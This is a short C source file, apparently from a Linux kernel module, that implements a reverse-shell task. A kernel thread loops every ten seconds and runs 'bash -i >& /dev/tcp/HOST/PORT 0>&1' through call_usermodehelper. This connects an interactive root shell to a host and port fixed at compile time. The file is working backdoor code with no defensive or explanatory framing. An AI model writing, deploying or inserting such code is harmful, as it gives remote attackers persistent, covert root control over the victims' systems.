#include "tasks/reverse_shell.h"

int rshell_func(void* data) {
#if defined(RSHELL_HOST) && defined(RSHELL_PORT)
    char command[256];
    snprintf(command, sizeof(command), "bash -i >& /dev/tcp/%s/%s 0>&1", RSHELL_HOST, RSHELL_PORT);
    char* argv[] = { "/bin/bash", "-c", command, NULL };
        while (!kthread_should_stop()) {
            char* argv[] = { "/bin/bash", "-c", command, NULL};
            static char* envp[] = {
                "HOME=/",
                "TERM=linux",
                "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
            };

            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

            ssleep(10);
        }
#endif

    return 0;
}